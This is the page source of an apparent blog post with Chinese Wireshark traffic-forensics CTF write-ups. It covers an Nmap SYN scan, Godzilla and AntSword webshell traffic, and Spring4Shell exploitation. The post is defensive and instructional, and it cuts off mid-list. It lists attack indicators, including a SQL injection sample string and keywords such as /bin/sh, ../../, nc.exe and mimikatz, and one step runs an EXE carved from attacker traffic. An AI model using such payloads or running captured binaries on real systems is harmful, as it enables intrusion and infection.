@@ -1,0 +1,466 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>流量分析 | 0xMouise</title><meta name="author" content="0xMouise"><meta name="copyright" content="0xMouise"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="h流量分析Ann-wireshark-001  流量包中最主要的渗透测试操作是什么？ 使用的端口扫描方式是什么？ 发起扫描的主机的ip是多少？ 扫描到了哪些端口？ 被扫描的主机的apache版本是多少？   流量包中最主要的渗透测试操作是什么？   在流量包（例如 .pcap 文件）中分析“最主要的渗透测试操作”通常指的是识别攻击者在渗透过程中实施的关键行为  1. 信息收集（Reconnaiss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="流量分析">
+<meta property="og:url" content="https://0xmouise.github.io/2025/09/15/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="0xMouise">
+<meta property="og:description" content="h流量分析Ann-wireshark-001  流量包中最主要的渗透测试操作是什么？ 使用的端口扫描方式是什么？ 发起扫描的主机的ip是多少？ 扫描到了哪些端口？ 被扫描的主机的apache版本是多少？   流量包中最主要的渗透测试操作是什么？   在流量包（例如 .pcap 文件）中分析“最主要的渗透测试操作”通常指的是识别攻击者在渗透过程中实施的关键行为  1. 信息收集（Reconnaiss">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/009b6JyXly1i5ff9rz4hqj31hc0xcqv5.jpg">
+<meta property="article:published_time" content="2025-09-15T15:30:00.000Z">
+<meta property="article:modified_time" content="2025-09-16T07:43:46.748Z">
+<meta property="article:author" content="0xMouise">
+<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="流量分析">
+<meta property="article:tag" content="网络取证">
+<meta property="article:tag" content="应急响应">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/009b6JyXly1i5ff9rz4hqj31hc0xcqv5.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "流量分析",
+  "url": "https://0xmouise.github.io/2025/09/15/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/",
+  "image": "https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/009b6JyXly1i5ff9rz4hqj31hc0xcqv5.jpg",
+  "datePublished": "2025-09-15T15:30:00.000Z",
+  "dateModified": "2025-09-16T07:43:46.748Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "0xMouise",
+      "url": "https://0xMouise.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmxlm4j30u00u9wk1.jpg"><link rel="canonical" href="https://0xmouise.github.io/2025/09/15/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '流量分析',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmwmxmj31hc0u07wh.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmxlm4j30u00u9wk1.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">94</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/009b6JyXly1i5ff9rz4hqj31hc0xcqv5.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">0xMouise</span></a><a class="nav-page-title" href="/"><span class="site-name">流量分析</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">流量分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-15T15:30:00.000Z" title="发表于 2025-09-15 23:30:00">2025-09-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-16T07:43:46.748Z" title="更新于 2025-09-16 15:43:46">2025-09-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="h流量分析"><a href="#h流量分析" class="headerlink" title="h流量分析"></a>h流量分析</h1><h2 id="Ann-wireshark-001"><a href="#Ann-wireshark-001" class="headerlink" title="Ann-wireshark-001"></a>Ann-wireshark-001</h2><blockquote>
+<ol>
+<li>流量包中最主要的渗透测试操作是什么？</li>
+<li>使用的端口扫描方式是什么？</li>
+<li>发起扫描的主机的ip是多少？</li>
+<li>扫描到了哪些端口？</li>
+<li>被扫描的主机的apache版本是多少？</li>
+</ol>
+</blockquote>
+<p><strong>流量包中最主要的渗透测试操作是什么？</strong></p>
+<blockquote>
+<p> 在流量包（例如 <code>.pcap</code> 文件）中分析“最主要的渗透测试操作”通常指的是识别攻击者在渗透过程中实施的关键行为</p>
+</blockquote>
+<p><strong>1. 信息收集（Reconnaissance）</strong></p>
+<p>这是渗透测试的第一步，也是网络中最容易被检测到的行为之一：</p>
+<ul>
+<li><strong>主机扫描（Ping Sweep）</strong></li>
+<li><strong>端口扫描（TCP SYN、TCP Connect、UDP）</strong><ul>
+<li>工具：Nmap、Masscan</li>
+</ul>
+</li>
+<li><strong>操作系统探测</strong><ul>
+<li>TTL、窗口大小等特征分析</li>
+</ul>
+</li>
+<li><strong>服务版本探测</strong><ul>
+<li>如 <code>GET / HTTP/1.0\r\n\r\n</code> 请求抓取服务器 banner</li>
+</ul>
+</li>
+</ul>
+<p>🛠 <strong>典型特征：</strong></p>
+<ul>
+<li>多目标、多个端口短时间内被访问</li>
+<li>SYN 包密集发送，无完整握手</li>
+</ul>
+<hr>
+<p><strong>🧪 2. 漏洞利用（Exploitation）</strong></p>
+<p>攻击者利用已知漏洞或弱点攻击目标系统：</p>
+<ul>
+<li><strong>Web 攻击</strong><ul>
+<li>SQL 注入：<code>id=1&#39; or &#39;1&#39;=&#39;1</code></li>
+<li>XSS、LFI、RFI</li>
+<li>文件上传绕过</li>
+</ul>
+</li>
+<li><strong>Shellshock、Log4j 等漏洞利用</strong></li>
+<li><strong>缓冲区溢出（在二进制协议或服务中）</strong></li>
+<li><strong>MS17-010、EternalBlue等漏洞包</strong></li>
+</ul>
+<p>🛠 <strong>典型特征：</strong></p>
+<ul>
+<li>请求中带有明显 payload</li>
+<li>出现 <code>cmd.exe</code>, <code>bash</code>, <code>/bin/sh</code>、<code>../../</code> 等关键字</li>
+<li>返回包中有回显，如：<code>uid=0(root) gid=0(root) groups=0(root)</code></li>
+</ul>
+<hr>
+<p><strong>📡 3. 会话控制 &#x2F; 权限维持</strong></p>
+<p>获取 shell 并维持对目标控制：</p>
+<ul>
+<li><strong>反弹 shell</strong><ul>
+<li>TCP 会话连接至攻击者主机（比如目标主机主动访问某个高位端口）</li>
+</ul>
+</li>
+<li><strong>Meterpreter、Cobalt Strike 会话</strong></li>
+<li><strong>Beacon通信</strong></li>
+</ul>
+<p>🛠 <strong>典型特征：</strong></p>
+<ul>
+<li>出站连接，目标主机主动连接外部 IP（非常规端口）</li>
+<li>通信数据呈现固定间隔，包小且有规律（C2 通信）</li>
+</ul>
+<p><strong>🔐 4. 凭证窃取 &#x2F; 枚举</strong></p>
+<p>攻击者尝试获得敏感信息：</p>
+<ul>
+<li><strong>SMB 枚举、NTLM 抓包</strong></li>
+<li><strong>FTP、POP3、IMAP 明文传输密码</strong></li>
+<li><strong>MitM 攻击拦截 HTTP、Telnet、FTP等明文协议</strong></li>
+</ul>
+<p>🛠 <strong>典型特征：</strong></p>
+<ul>
+<li>包含用户名密码字段（如 <code>USER admin</code>, <code>PASS 123456</code>）</li>
+<li>ARP 欺骗 + 重复 MAC 地址响应</li>
+</ul>
+<hr>
+<p><strong>📤 5. 数据回传 &#x2F; 文件上传下载</strong></p>
+<p>攻击者在提权或获取信息后尝试回传数据：</p>
+<ul>
+<li><strong>文件 exfiltration（数据泄露）</strong></li>
+<li><strong>下载工具上传工具（如 nc.exe, mimikatz.exe）</strong></li>
+</ul>
+<p>🛠 <strong>典型特征：</strong></p>
+<ul>
+<li>HTTP&#x2F;FTP POST 请求携带大量数据</li>
+<li>使用非常规 HTTP 方法（如 PUT）</li>
+</ul>
+<p><strong>流量包中最主要的渗透测试操作是什么？</strong></p>
+<table>
+<thead>
+<tr>
+<th>操作类型</th>
+<th>流量特征关键词</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>端口扫描</td>
+<td>大量 SYN，多个端口</td>
+</tr>
+<tr>
+<td>漏洞利用</td>
+<td>payload 特征，异常 URL、命令行语句</td>
+</tr>
+<tr>
+<td>Shell 反弹</td>
+<td>出站 TCP 连接</td>
+</tr>
+<tr>
+<td>C2 通信</td>
+<td>周期小数据包、TLS、DNS 隧道</td>
+</tr>
+<tr>
+<td>密码抓取</td>
+<td>明文密码字段、NTLM challenge</td>
+</tr>
+<tr>
+<td>数据泄露</td>
+<td>FTP&#x2F;HTTP PUT、POST 大量数据</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TCP三次握手的过程如下：</span><br><span class="line"></span><br><span class="line">SYN: 客户端发送一个SYN报文来请求建立连接。</span><br><span class="line">SYN-ACK: 服务器收到请求后，发送一个SYN-ACK报文表示同意连接。</span><br><span class="line">ACK: 客户端收到服务器的SYN-ACK报文后，发送一个ACK报文以确认连接。</span><br><span class="line"></span><br><span class="line">[RST] 表示重置连接的请求，通常用于终止一个连接</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>使用显示过滤器查找 SYN 扫描</p>
+<ul>
+<li><p>在 Wireshark 的 <strong>Display Filter</strong>（显示过滤器）输入：</p>
+<ul>
+<li><pre><code>tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0 
+//这个 TCP 包设置了 SYN 标志位（同步标志）
+//这个 TCP 包没有设置 ACK 标志位
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">     * 同一源 IP 向多个目的端口发送 SYN 包，目标 IP 不变或变化不大，只显示发起三次握手的第一个 SYN 报文（未带 ACK），一般是扫描行为第一步。</span><br><span class="line"></span><br><span class="line">       * 某一个源 IP（如攻击者机器）</span><br><span class="line">       * 短时间向多个端口或多个 IP 发出 SYN 请求</span><br><span class="line"></span><br><span class="line">     * ![image-20250623200138369](/img/image-20250623200138369.png)</span><br><span class="line"></span><br><span class="line">2. 并没有什么有用的信息，我们尝试着搜索使用的工具</span><br><span class="line">   * `tcp contains &quot;nmap&quot;` </span><br><span class="line">     * contains是 Wireshark 的一个**模糊匹配运算符**，意思是“包的载荷中包含”</span><br><span class="line">   * 端口扫描-扫描工具nmap</span><br><span class="line">     * ![image-20250623200417019](/img/image-20250623200417019.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**使用的端口扫描方式是什么？**</span><br><span class="line"></span><br><span class="line">1. **主要扫描方式：TCP SYN扫描（-sS）**在Wireshark中观察到大量`tcp.flags.syn == 1 and tcp.flags.ack == 0`的数据包（仅SYN标志），且开放端口有SYN/ACK响应，关闭端口有RST响应 </span><br><span class="line"></span><br><span class="line">   * &gt; 这是Nmap的**默认扫描方式**（需root权限）。攻击机向目标端口发送SYN包，若端口开放则目标回复SYN/ACK，攻击机随即发送RST终止连接（不完成三次握手）；若端口关闭则目标回复RST/ACK。此方式隐蔽性强且速度快，不会建立完整连接</span><br><span class="line"></span><br><span class="line">2. 在Wireshark的过滤器中输入 `tcp.flags.reset == 1`，查看是否有RST响应。</span><br><span class="line"></span><br><span class="line">   * ![image-20250624091454950](/img/image-20250624091454950.png)</span><br><span class="line">   * ![image-20250624092535819](/img/image-20250624092535819.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**发起扫描的主机的ip是多少？**</span><br><span class="line"></span><br><span class="line">1. 从上面图片可知攻击者的ip是192.168.0.4看谁扫了谁，hack去扫，那就过滤hack的源ip</span><br><span class="line"></span><br><span class="line">**扫描到了哪些端口？** </span><br><span class="line"></span><br><span class="line">1. 使用命令`ip.src == 192.168.0.2 &amp;&amp; tcp.flags.syn ==1 &amp;&amp; tcp.flags.ack ==1`</span><br><span class="line">2. 在统计 --&gt; 端点 --&gt;TCP查看</span><br><span class="line">   * ![image-20250624093941683](/img/image-20250624093941683.png)</span><br><span class="line">   * ![image-20250624094425837](/img/image-20250624094425837.png)</span><br><span class="line"></span><br><span class="line">**被扫描的主机的apache版本是多少？**</span><br><span class="line"></span><br><span class="line">1. 在过滤框面搜索`http` 拿到相关协议的流量包 在应用层可以看到 被扫描主机的apache是2.4.23</span><br><span class="line"></span><br><span class="line">   * ![image-20250624180117915](/img/image-20250624180117915.png)</span><br><span class="line"></span><br><span class="line">   * ![image-20250624172716501](/img/image-20250624172716501.png)</span><br><span class="line"></span><br><span class="line">## Ann-wireshark-002</span><br><span class="line"></span><br><span class="line">**找到flag**</span><br><span class="line"></span><br><span class="line">&gt; 提示：哥斯拉AES流量</span><br><span class="line"></span><br><span class="line">1. 我们根据寻找“哥斯拉（Godzilla）”木马流量，需结合其流量特征进行针对性分析 以下是哥斯拉流量包的强特征</span><br><span class="line"></span><br><span class="line">   * 流量中可见`eval`、`base64_decode`、`strrev`等函数</span><br><span class="line"></span><br><span class="line">   * 第一个请求总会发送大量数据，这是配置信息，且请求包内无 cookie，服务器响应包无内容，生成一个 session，后续请求会带上此session 到请求包中的 cookie中3、强特征:生成的 cookie 后面有个分号</span><br><span class="line"></span><br><span class="line">   * Accept:</span><br><span class="line">     text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*</span><br><span class="line">     /*;q=0.8</span><br><span class="line">   * Accept-Language :</span><br><span class="line">     zh-CN,zh;q=0.8,zh-Tw;q=0.7,zh-HK;q=0.5,en-Us;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">2. 哥斯拉的协议依赖：HTTP 是攻击流量的主要载体 哥斯拉的 webshell 工作原理要求其通信必须通过 HTTP 协议实现</span><br><span class="line"></span><br><span class="line">   * **过滤HTTP POST请求**</span><br><span class="line"></span><br><span class="line">     * ```</span><br><span class="line">       http.request.method == &quot;POST&quot;  # 哥斯拉所有操作均通过POST传输加密数据 </span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p><img src="/img/image-20250624190622621.png" alt="image-20250624190622621"></p>
+</li>
+<li><p>大量的POST请求被发送到同一个URL（<code>/shell.jsp</code>），这可能是尝试利用Web应用程序中的漏洞，例如上传恶意文件或执行命令</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>我们这里对<code>/shell.jsp</code>文件进行过滤查看有没有什么问题</p>
+<ul>
+<li><pre><code>http.request.uri contains &quot;test.jsp&quot;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   * ![image-20250624191202758](/img/image-20250624191202758.png)</span><br><span class="line"></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">4. 根据流量包的信息可以看到攻击者对网站进行了命令执行的操作，根据哥斯拉的流量特征，第一个请求总会发送大量数据，这是配置信息。我们对长度为1129的流量进行追踪流 </span><br><span class="line"></span><br><span class="line">   * 在这里看到了md5加密 拿到网站进行解密即可得到flag</span><br><span class="line"></span><br><span class="line">   * ![image-20250624191529383](/img/image-20250624191529383.png)</span><br><span class="line"></span><br><span class="line">## Ann-wireshark-003</span><br><span class="line"></span><br><span class="line"> **黑客使用什么漏洞拿下root权限的？**</span><br><span class="line"></span><br><span class="line">1. 观察流量，可以看到前面的请求均为/helloworld/xx，服务器返回404，推测是暴破流量</span><br><span class="line">   * ![image-20250625204129244](/img/image-20250625204129244.png)</span><br><span class="line">2. 在最后的部分出现了shell.jsp，于是我们向上查看最后一次/helloworld/greeting的流量。</span><br><span class="line">   * ![image-20250625204815906](/img/image-20250625204815906.png)</span><br><span class="line">3. 追踪http数据流，可以看到[请求体](https://so.csdn.net/so/search?q=请求体&amp;spm=1001.2101.3001.7020)为一个网页</span><br><span class="line">   * ![image-20250625204852374](/img/image-20250625204852374.png)</span><br><span class="line">4. 搜索标题Reznok’s Hello World Spring Application，得到网页https://github.com/reznok/Spring4Shell-POC，其中记录[漏洞编号](https://so.csdn.net/so/search?q=漏洞编号&amp;spm=1001.2101.3001.7020)为CVE-2022-22965</span><br><span class="line">   * ![image-20250625204951488](/img/image-20250625204951488.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Ann-wireshark-004</span><br><span class="line"></span><br><span class="line">题目：</span><br><span class="line"></span><br><span class="line">1. 连接蚁剑的正确密码是？</span><br><span class="line">2. 攻击者存留的值是？格式：`xxx-xxx-xxx-xxx`</span><br><span class="line">3. 攻击者下载到的flag是？格式：flag3&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1. 首先要清楚蚁剑的流量特征 蚁剑的流量包采用`post`方式提交 </span><br><span class="line"></span><br><span class="line">   * ```</span><br><span class="line">     http &amp;&amp; http.request.method==POST &amp;&amp; http contains &quot;.php&quot;</span><br></pre></td></tr></table></figure>
+
+* 追踪流查看-蚁剑密码**6ea280898e404bfabd0ebb702327b19f**
+</code></pre>
+</li>
+<li><p><img src="/img/image-20250624203814847.png" alt="image-20250624203814847"></p>
+</li>
+</ul>
+</li>
+<li><p>攻击者存留的值是？格式：<code>xxx-xxx-xxx-xxx</code></p>
+<ul>
+<li><p>什么是攻击者的预留值？</p>
+<ul>
+<li><strong>定义</strong>：该值是攻击者在入侵目标系统后，通过工具（如蚁剑、WebShell）或配置文件（如<code>hacker.txt</code>）中写入的唯一标识符，可能用于后续的权限维持、会话跟踪或数据加密。</li>
+<li><strong>作用</strong>：作为攻击者与目标系统交互的“密钥”，可能关联到内存马、后门程序或加密通信的密钥。</li>
+</ul>
+</li>
+<li><p>如何确定攻击者留存的值？</p>
+</li>
+<li><p>使用Wireshark过滤蚁剑流量（如<code>http</code>或<code>tcp</code>协议），追踪相关TCP流</p>
+</li>
+<li><p>通过Base64解码或URL解码提取数据包中的字符串</p>
+</li>
+<li><p>留存是应该是写入的动作，所以一个接一个的流量包翻找就行了，并且只需要配合URL解码和Base64就能看到全文</p>
+<ul>
+<li><img src="/img/image-20250625174920380.png" alt="image-20250625174920380"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>攻击者下载到的flag是？格式：flag3{xxx}</p>
+<ul>
+<li><p>追踪TCP流，发现开头是MZ，明显是个EXE文件</p>
+</li>
+<li><p>复制出来粘贴winhex里</p>
+</li>
+<li><p>这里响应头给他去掉，保存运行</p>
+</li>
+<li><p>在桌面生成了张图片，查看下，更改长宽</p>
+</li>
